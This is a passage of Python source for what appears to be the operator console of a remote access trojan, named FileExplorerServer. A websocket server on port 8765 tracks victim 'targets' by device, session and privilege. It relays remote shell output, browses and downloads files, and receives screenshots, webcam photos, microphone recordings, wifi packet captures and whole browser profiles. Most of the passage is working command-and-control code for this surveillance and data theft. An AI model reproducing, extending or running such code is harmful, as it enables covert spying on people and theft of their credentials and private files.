                                    if instance_id_from_client in self.connected_clients[device_id]['instances']:
                                        self.connected_clients[device_id]['instances'][instance_id_from_client]['session_id'] = data.get('session_id', '')
                                        self.connected_clients[device_id]['instances'][instance_id_from_client]['privilege'] = data.get('privilege', '')
                                    
                                    self.update_client_list()
                                
                                # Handle system info normally
                                self.handle_json_message(data, websocket, device_id, instance_id_from_client)
                            
                            # Handle all other messages
                            else:
                                self.handle_json_message(data, websocket, device_id, instance_id)
                                
                    except json.JSONDecodeError as je:
                        print(f"[WEBSOCKET] JSON decode error: {je}")
                    except Exception as e:
                        print(f"[WEBSOCKET] Message processing error: {e}")
            except Exception as e:
                print(f"Client Error: {e}")
                import traceback
                traceback.print_exc()
            finally:
                self.clients.discard(websocket)
                
                # Remove from connected_clients to prevent targeting dead sockets
                disconnected_device = None
                disconnected_instance = None

                for dev_id, device_info in list(self.connected_clients.items()):
                    for inst_id, inst_info in list(device_info.get('instances', {}).items()):
                        if inst_info.get('websocket') == websocket:
                            del device_info['instances'][inst_id]
                            disconnected_device = dev_id
                            disconnected_instance = inst_id
                            self.update_shell_output(f"[-] Instance {inst_id[:4]} disconnected.\n", 'error')
                            break
                
                if disconnected_device:
                    # If we disconnected the currently selected instance, reset selection
                    if self.selected_instance_id == f"INSTANCE:{disconnected_device}:{disconnected_instance}":
                        self.selected_instance_id = None
                        self.selected_device_id = None
                        self.update_shell_output("[!] Target disconnected. Reset selection.\n", 'warning')
                
                self.update_client_list()
                
                if not self.clients:
                    self.disable_controls()

        async def main():
            self.server = await websockets.serve(
                handle_client, "0.0.0.0", 8765,
                max_size=100 * 1024 * 1024, compression=None, ping_interval=None
            )
            await asyncio.Future()

        try: 
            self.loop.run_until_complete(main())
        except: 
            pass
        finally: 
            try: 
                self.loop.close()
            except: 
                pass
            self.loop = None
            self.server = None

    async def _shutdown_server(self):
        try:
            self.server.close()
            await self.server.wait_closed()
        except: 
            pass

    def handle_binary_file(self, data):
        try:
            newline_pos = data.find(b'\n')
            
            if newline_pos > 0 and newline_pos < 500:
                header = data[:newline_pos].decode('utf-8')
                file_data = data[newline_pos + 1:]
                
                header_json = json.loads(header)
                file_type = header_json.get('type', '')
                
                if file_type == 'preview':
                    b64_data = base64.b64encode(file_data).decode('utf-8')
                    self.send_preview_data(f"data:image/jpeg;base64,{b64_data}", 'image')
                    return

                if file_type == 'screenshot': 
                    self.save_file(file_data, 'screenshot', 'png')
                elif file_type == 'webcam_photo': 
                    self.save_file(file_data, 'webcam', 'jpg')
                elif file_type == 'microphone_recording': 
                    self.save_file(file_data, 'audio', 'wav', header_json.get('duration', 'unknown'))
                elif file_type == 'wallpaper_image': 
                    self.save_file(file_data, 'wallpaper', 'jpg')
                elif file_type == 'wifi_sniff_result': 
                    self.save_file(file_data, 'wifi_capture', 'pcap', header_json.get('duration', 0))
                elif file_type == 'browser_profile_data':
                    profile_name = header_json.get('profile_name', 'profile')
                    size = header_json.get('size', 0)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"browser_{profile_name}_{timestamp}.zip"
                    filepath = os.path.join(self.captures_dir, filename)
                    
                    self.update_shell_output(f"[+] Receiving browser profile: {profile_name} ({size} bytes)\n", 'info')
                    self.update_shell_output(f"[+] Actual data received: {len(file_data)} bytes\n", 'info')
                    
                    with open(filepath, 'wb') as f:
                        f.write(file_data)
                    
                    self.update_shell_output(f"[✓] Browser profile saved: {filename}\n", 'success')
                    self.update_shell_output(f"[📁] Location: {filepath}\n", 'info')
                    
                    self.browserTransferring = False
                else:
                    print(f"[BINARY] Unknown file type: {file_type}")
                        
        except Exception as e: 
            print(f"[BINARY] Error: {e}")
            import traceback
            traceback.print_exc()
            self.update_shell_output(f"[!] Binary file error: {e}\n", 'error')
            
            if hasattr(self, 'browserTransferring'):
                self.browserTransferring = False

    def handle_json_message(self, data, websocket=None, device_id=None, instance_id=None):
        msg_type = data.get('type', '')
        
        if msg_type == 'device_id':
            return
        
        elif msg_type == 'nav_status':
            self.update_nav_status(data)
            return

        elif msg_type == 'browser_profiles' or msg_type == 'list_browser_profiles':
            profiles = data.get('profiles', [])
            self.update_shell_output(f"[+] Found {len(profiles)} browser profiles.\n", 'success')
            self.show_browser_profile_modal(profiles)
            return
        
        elif msg_type == 'system_info':
            device_id = data.get('device_id', 'UNKNOWN')
            hostname = data.get('hostname', 'unknown')
            username = data.get('username', 'unknown')
            pwd = data.get('pwd', '/')
            
            if device_id in self.connected_clients:
                self.connected_clients[device_id]['hostname'] = hostname
                self.connected_clients[device_id]['username'] = username
                self.update_client_list()
            
            info = f"""
╔═══════════════════════════════════════════════╗
║ CLIENT CONNECTED                              ║
╠═══════════════════════════════════════════════╣
║ Device ID: {device_id[:8] if len(device_id) > 8 else device_id:<35} ║
║ Hostname:  {hostname:<35} ║
║ Username:  {username:<35} ║
╚═══════════════════════════════════════════════╝
"""
            self.update_shell_output(info, 'info')
            self.update_pwd_label(pwd)
            self.list_directory(self.home_path)
            return
            
        elif msg_type == 'shell_output':
            output = data.get('output', '')
            new_pwd = data.get('pwd', self.current_path)
            
            if output: 
                self.update_shell_output(output + "\n", 'output')
            
            # Update the path label immediately
            self.update_pwd_label(new_pwd)
            
            # ==========================================================
            # FIX: Auto-refresh file explorer if directory changed
            # ==========================================================
            # If the new path is different from the current path, trigger a list update.
            # list_directory handles history automatically.
            if new_pwd and new_pwd != self.current_path:
                # Note: We do NOT update self.current_path here. 
                # We wait for the 'directory_listing' response to update it.
                self.list_directory(new_pwd)
            
        elif msg_type == 'directory_listing':
            # Update current path state only when we get the listing back
            self.current_path = data.get('path', '/')
            items = data.get('items', [])
            self.display_directory_items(items)
            
        elif msg_type == 'preview':
            content_type = data.get('content_type')
            if content_type == 'text':
                content = data.get('content', '')
                self.send_preview_data(content, 'text')
                
        elif msg_type == 'download_start':
            self.download_filename = data.get('filename', 'download')
            self.download_size = data.get('size', 0)
            self.download_buffer = bytearray()
            self.downloading = True
            
        elif msg_type == 'download_complete':
            if not self.download_buffer: return
            filepath = os.path.join(self.captures_dir, self.download_filename)
            with open(filepath, 'wb') as f: 
                f.write(self.download_buffer)
            self.update_shell_output(f"[+] File saved to: {filepath}\n", 'success')
            self.downloading = False
            self.download_buffer = bytearray()
            
        elif msg_type == 'rename_success':
            self.update_shell_output(f"[✓] Rename successful\n", 'success')
        elif msg_type == 'delete_success':
            self.update_shell_output(f"[✓] Delete successful\n", 'success')
        elif msg_type == 'notification_result':
            self.update_shell_output(f"[✓] Notification result: {data.get('result', '')}\n", 'success')
        elif msg_type == 'upload_success':
            self.update_shell_output(f"[✓] Upload complete\n", 'success')
            self.refresh_current()
        elif msg_type == 'upload_error':
            self.update_shell_output(f"[✗] Upload failed: {data.get('message', '')}\n", 'error')
        elif msg_type == 'error':
            self.update_shell_output(f"[ERROR] {data.get('message', '')}\n", 'error')
        
        else:
            self.handle_advanced_responses(data)

    def format_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0: 
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} PB"

if __name__ == "__main__":
    app = FileExplorerServer()
    app.run()